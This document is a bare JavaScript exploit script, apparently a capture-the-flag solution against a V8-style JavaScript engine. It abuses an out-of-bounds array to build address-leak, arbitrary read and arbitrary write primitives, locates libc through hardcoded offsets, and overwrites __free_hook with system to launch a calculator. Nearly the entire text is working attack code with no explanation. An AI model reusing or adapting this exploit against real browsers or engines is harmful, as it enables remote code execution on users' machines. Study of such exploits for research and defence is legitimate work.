var bytes   = new ArrayBuffer(8);
var f64_buf = new Float64Array(bytes);
var u64_buf = new BigUint64Array(bytes);

function f64_to_u64(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function u64_to_f64(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

var oob_arr = [1.1];
oob_arr = oob_arr.slice(0, 1);
console.assert(oob_arr.length == 3);

var obj_arr = [{}];
var rw_arr  = [2.2];

oob_arr_elem = f64_to_u64(oob_arr[2]) & 0xffffffffn;
oob_arr[2] = u64_to_f64(((1000n << 1n) << 32n) + oob_arr_elem);
console.assert(oob_arr.length == 1000);

function addrof(obj) {
  obj_arr[0] = obj;
  return (f64_to_u64(oob_arr[4]) & 0xffffffffn) - 1n;
}

function arb_read_u64_cmpr(addr) {
  var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
  oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 
  return f64_to_u64(rw_arr[0]); 
}

function arb_read_u64(addr) {
  var buf  = new ArrayBuffer(16);
  var view = new DataView(buf);

  var buf_bck_store = addrof(buf) + 0x14n;
  arb_write_u64_cmpr(buf_bck_store, addr);

  return view.getBigUint64(0, true);
}

function arb_write_u64_cmpr(addr, val) {
  var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
  oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 
  rw_arr[0] = u64_to_f64(val);
}

function arb_write_u64(addr, val) {
  var buf  = new ArrayBuffer(16);
  var view = new DataView(buf);

  var buf_bck_store = addrof(buf) + 0x14n;
  arb_write_u64_cmpr(buf_bck_store, addr);

  view.setBigUint64(0, val, true);
}

var obj_addr = addrof(oob_arr);
var map_base = (arb_read_u64_cmpr(obj_addr) & 0xffffffffn) - 0x438fdn;
var heap_ptr = arb_read_u64_cmpr(map_base + 0x40n);
var elf_base = arb_read_u64(heap_ptr) - 0x14df688n; 

var libc_base = arb_read_u64(elf_base + 0x152df20n) - 0x84420n;
var __free_hook = libc_base + 0x1eee48n;
var system = libc_base + 0x52290n;

arb_write_u64(__free_hook, system); 
console.log("xcalc");
